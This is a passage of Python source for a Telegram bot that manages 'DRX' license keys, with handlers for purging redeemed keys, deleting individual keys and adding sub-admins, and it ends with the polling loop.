        InlineKeyboardButton("❌ Cancel", callback_data="km_home")
    )

    bot.edit_message_text(
        f"""
⚠️ <b>DATABASE CLEAN</b>

━━━━━━━━━━━━━━━━━━

This action will permanently remove
<b>ALL redeemed keys</b>.

🔴 <b>Redeemed Keys Found:</b>

<code>{redeemed}</code>

━━━━━━━━━━━━━━━━━━

Are you sure?
""",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        parse_mode="HTML",
        reply_markup=markup
    )
@bot.callback_query_handler(func=lambda call: call.data == "km_clean_yes")
def km_clean_yes(call):

    keys = load_data(KEYS_FILE)

    new_keys = {}
    removed = 0

    for key, data in keys.items():

        if isinstance(data, dict):

            if data.get("redeemed", False):
                removed += 1
            else:
                new_keys[key] = data

        else:
            # Keep old-format keys
            new_keys[key] = data

    save_data(KEYS_FILE, new_keys)

    markup = InlineKeyboardMarkup()

    markup.add(
        InlineKeyboardButton("🏠 Home", callback_data="km_home")
    )

    bot.edit_message_text(
        f"""
✅ <b>DATABASE CLEANED</b>

━━━━━━━━━━━━━━━━━━

🗑 <b>Keys Removed</b>

<code>{removed}</code>

🔑 <b>Remaining Keys</b>

<code>{len(new_keys)}</code>

━━━━━━━━━━━━━━━━━━

💾 Database Updated Successfully
""",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        parse_mode="HTML",
        reply_markup=markup
    )
@bot.callback_query_handler(func=lambda call: call.data == "km_delete")
def km_delete(call):

    user_id = str(call.from_user.id)

    admin_states[user_id] = "waiting_delete_key"

    markup = InlineKeyboardMarkup()

    markup.add(
        InlineKeyboardButton("🏠 Back", callback_data="km_home")
    )

    bot.edit_message_text(
        """
🗑 <b>DELETE LICENSE KEY</b>

━━━━━━━━━━━━━━━━━━

Please send the license key
you want to delete.

<b>Example</b>

<code>DRX-ABC123</code>

━━━━━━━━━━━━━━━━━━

Waiting for input...
""",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        parse_mode="HTML",
        reply_markup=markup
    )
@bot.message_handler(func=lambda message: str(message.from_user.id) in admin_states)
def key_manager_input(message):

    user_id = str(message.from_user.id)

    if admin_states[user_id] != "waiting_delete_key":
        return

    key = message.text.strip().upper()

    keys = load_data(KEYS_FILE)

    if key not in keys:

        del admin_states[user_id]

        return bot.reply_to(
            message,
            f"""
❌ <b>KEY NOT FOUND</b>

━━━━━━━━━━━━━━━━━━

<code>{key}</code>

does not exist in the database.
""",
            parse_mode="HTML"
        )

    data = keys[key]

    if isinstance(data, dict):

        duration = data.get("duration", "N/A")
        created = data.get("created_at", "N/A")
        expires = data.get("expires_at", "N/A")

        status = "🔴 REDEEMED" if data.get("redeemed") else "🟢 READY"

    else:

        duration = data
        created = "N/A"
        expires = "N/A"
        status = "🟢 READY"

    markup = InlineKeyboardMarkup(row_width=2)

    markup.add(
        InlineKeyboardButton(
            "✅ DELETE",
            callback_data=f"km_delete_yes:{key}"
        ),
        InlineKeyboardButton(
            "❌ CANCEL",
            callback_data="km_home"
        )
    )

    bot.reply_to(
        message,
        f"""
⚠️ <b>CONFIRM DELETE</b>

━━━━━━━━━━━━━━━━━━

🔑 <code>{key}</code>

💎 Plan
<code>{duration.upper()}</code>

🕒 Created
<code>{created}</code>

⌛ Expires
<code>{expires}</code>

📌 Status
<code>{status}</code>

━━━━━━━━━━━━━━━━━━

This action cannot be undone.
""",
        parse_mode="HTML",
        reply_markup=markup
    )

    del admin_states[user_id]
@bot.callback_query_handler(func=lambda call: call.data.startswith("km_delete_yes:"))
def km_delete_yes(call):

    key = call.data.split(":", 1)[1]

    keys = load_data(KEYS_FILE)

    if key not in keys:

        return bot.answer_callback_query(
            call.id,
            "Key not found."
        )

    data = keys[key]

    del keys[key]

    save_data(KEYS_FILE, keys)

    if isinstance(data, dict):
        duration = data.get("duration", "N/A")
    else:
        duration = data

    markup = InlineKeyboardMarkup(row_width=2)

    markup.add(
        InlineKeyboardButton("📋 List Keys", callback_data="km_list"),
        InlineKeyboardButton("🏠 Home", callback_data="km_home")
    )

    bot.edit_message_text(
        f"""
✅ <b>LICENSE KEY DELETED</b>

━━━━━━━━━━━━━━━━━━

🔑 <b>Key</b>

<code>{key}</code>

💎 <b>Plan</b>

<code>{duration.upper()}</code>

🗑 <b>Status</b>

<code>REMOVED SUCCESSFULLY</code>

━━━━━━━━━━━━━━━━━━

💾 Database Updated Successfully
""",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        parse_mode="HTML",
        reply_markup=markup
    )
@bot.message_handler(commands=['adminmanage'])
def adminmanage(m):

    user_id = str(m.from_user.id)

    # Only Main Owner
    if user_id != config["admin"]:
        return bot.reply_to(
            m,
            "⛔ <b>Only the Main Admin can access this panel.</b>",
            parse_mode="HTML"
        )

    subadmins = load_data(SUBADMINS_FILE)

    markup = InlineKeyboardMarkup(row_width=2)

    markup.add(
        InlineKeyboardButton("➕ Add Admin", callback_data="am_add"),
        InlineKeyboardButton("👥 Manage", callback_data="am_manage")
    )

    markup.add(
        InlineKeyboardButton("📊 Permissions", callback_data="am_permissions"),
        InlineKeyboardButton("❌ Close", callback_data="am_close")
    )

    bot.send_message(
        m.chat.id,
        f"""
👑 <b>DRX ADMIN MANAGER</b>

━━━━━━━━━━━━━━━━━━

👥 <b>Total Sub Admins</b>

<code>{len(subadmins)}</code>

━━━━━━━━━━━━━━━━━━

Select an option below.
""",
        parse_mode="HTML",
        reply_markup=markup
    )
@bot.callback_query_handler(func=lambda call: call.data=="am_close")
def am_close(call):

    try:
        bot.delete_message(
            call.message.chat.id,
            call.message.message_id
        )
    except:
        pass
@bot.callback_query_handler(func=lambda call: call.data == "am_add")
def am_add(call):

    user_id = str(call.from_user.id)

    # Only Main Admin
    if user_id != config["admin"]:
        return

    admin_manager_states[user_id] = "waiting_subadmin_id"

    markup = InlineKeyboardMarkup()

    markup.add(
        InlineKeyboardButton("🏠 Back", callback_data="am_home")
    )

    bot.edit_message_text(
        """
👤 <b>ADD SUB ADMIN</b>

━━━━━━━━━━━━━━━━━━

Please send the Telegram User ID.

<b>Example</b>

<code>1427432977</code>

━━━━━━━━━━━━━━━━━━

Waiting for input...
""",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        parse_mode="HTML",
        reply_markup=markup
    )
@bot.callback_query_handler(func=lambda call: call.data == "am_home")
def am_home(call):

    subadmins = load_data(SUBADMINS_FILE)

    markup = InlineKeyboardMarkup(row_width=2)

    markup.add(
        InlineKeyboardButton("➕ Add Admin", callback_data="am_add"),
        InlineKeyboardButton("👥 Manage", callback_data="am_manage")
    )

    markup.add(
        InlineKeyboardButton("📊 Permissions", callback_data="am_permissions"),
        InlineKeyboardButton("❌ Close", callback_data="am_close")
    )

    bot.edit_message_text(
        f"""
👑 <b>DRX ADMIN MANAGER</b>

━━━━━━━━━━━━━━━━━━

👥 <b>Total Sub Admins</b>

<code>{len(subadmins)}</code>

━━━━━━━━━━━━━━━━━━

Select an option below.
""",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        parse_mode="HTML",
        reply_markup=markup
    )
@bot.message_handler(func=lambda m: str(m.from_user.id) in admin_manager_states)
def admin_manager_input(m):

    user_id = str(m.from_user.id)

    if admin_manager_states[user_id] != "waiting_subadmin_id":
        return

    sub_id = m.text.strip()

    if not sub_id.isdigit():

        return bot.reply_to(
            m,
            "❌ Invalid Telegram User ID."
        )

    admin_manager_states[user_id] = sub_id

    bot.reply_to(
        m,
        f"""
✅ User ID Received

<code>{sub_id}</code>

Permission selection will be added in the next step.
""",
        parse_mode="HTML"
    )
threading.Thread(
    target=expiry_checker,
    daemon=True
).start()
bot.infinity_polling(
    timeout=30,
    long_polling_timeout=30
)
